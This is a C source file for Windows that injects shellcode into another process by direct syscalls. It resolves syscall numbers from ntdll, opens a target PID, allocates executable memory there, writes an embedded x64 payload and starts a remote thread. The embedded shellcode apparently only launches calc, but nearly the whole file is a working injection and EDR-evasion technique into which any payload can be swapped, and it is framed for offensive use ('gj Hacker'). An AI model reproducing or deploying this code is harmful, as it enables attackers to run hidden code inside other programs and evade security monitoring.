#include "box.h"


DWORD GetSSN(HMODULE ModuleName, LPCSTR ProcName) {
    printf("\n***** %s *****\n", ProcName);
    DWORD sysCallNumber = 0;
    UINT_PTR targetNtFunction;

    targetNtFunction = (UINT_PTR)GetProcAddress(ModuleName, ProcName);
    if (targetNtFunction == 0) {
        warn("%s handle retrieval failed Error Code: 0x%lx", ProcName, GetLastError());
        return -1;
    }
    okay("Got handle to %s!", ProcName);

    sysCallNumber = ((PBYTE)(targetNtFunction + 0x4))[0];
    okay("SSN number for the %s successfully received! 0x%lx", ProcName, sysCallNumber);

    return sysCallNumber;
}

int main(int argc, char* argv[]) {
   CONST UCHAR shellcode[] = {
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x00"
   };

    HANDLE   hProcess            = NULL;
    HANDLE   hThread             = NULL;
    HMODULE  ntDLL               = NULL;
    PVOID    RemoteBuffer        = NULL;
    DWORD    PID, TID            = 0;
    size_t   shellcodeSize       = sizeof(shellcode);
    size_t   bytesWritten        = 0;
    NTSTATUS status              = 0;

    if (argc < 2) {
        warn("Usage: .\\injection.exe <PID>");
        return -1;
    }
    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES   objAttr = { sizeof(objAttr), NULL };
    CLIENT_ID           CID = { (HANDLE)PID, NULL };

    /* Get handle to ntdll and kernel32 */
    ntDLL = GetModuleHandleW(L"ntdll.dll");
    if (ntDLL == NULL) {
        printf("Failed to get handle to NTDLL. Error Code: 0x%lx\n", GetLastError());
        // goto _CLEAN;
    }
    okay("Got handle to ntdll and kernel32");

    /* NtOpenProcess */
    g_NtOpenProcessSSN = GetSSN(ntDLL, "NtOpenProcess");

    status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &CID);
    if (status != STATUS_SUCCESS) {
        warn("Failed to open handle to Process! Error Code: 0x%lx", status);
       //  goto _CLEAN;
        return -1;
    }
    okay("Got a handle for process!");

    g_NtAllocateVirtualMemorySSN = GetSSN(ntDLL, "NtAllocateVirtualMemory");
    status = NtAllocateVirtualMemory(hProcess, &RemoteBuffer, 0, &shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        warn("Failed to Allocate Memory in Process! Error Code: 0x%lx", status);
        goto _CLEAN;
    }
    okay("Allocated %zu-byte Memory in Process! Address: 0x%p", shellcodeSize, RemoteBuffer);

    g_NtWriteVirtualMemorySSN = GetSSN(ntDLL, "NtWriteVirtualMemory");
    status = NtWriteVirtualMemory(hProcess, RemoteBuffer, shellcode, sizeof(shellcode), &bytesWritten);
    if (status != STATUS_SUCCESS || bytesWritten != sizeof(shellcode)) {
        warn("Failed to Write Memory in Process! Error Code: 0x%lx", status);
        goto _CLEAN;
    }
    okay("\n Wrote %zu bytes to Memory in Process!", bytesWritten);

    g_NtCreateThreadExSSN = GetSSN(ntDLL, "NtCreateThreadEx");
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &objAttr, hProcess, RemoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        warn("Failed to create thread! Error: 0x%p", status);
        return -1;
    }

    /*
        extern NTSTATUS fn_NtWaitForSingleObject(
            _In_ HANDLE Handle,
            _In_ BOOLEAN Alertable,
            _In_opt_ PLARGE_INTEGER Timeout
        );
    */
    g_NtWaitForSingleObjectSSN = GetSSN(ntDLL, "NtWaitForSingleObject");
    NtWaitForSingleObject(hThread, FALSE, NULL);

    okay("DLL is executed! gj Hacker :>");
    goto _CLEAN;

_CLEAN:
    /*
        extern NTSTATUS fn_NtClose(
            IN HANDLE Handle
        );
    */
    g_NtCloseSSN = GetSSN(ntDLL, "NtClose");
    if (hThread) {
        NtClose(hThread);
    }
    if (hProcess) {
        NtClose(hProcess);
    }
    info("Ok, exit!");
    return 0;
}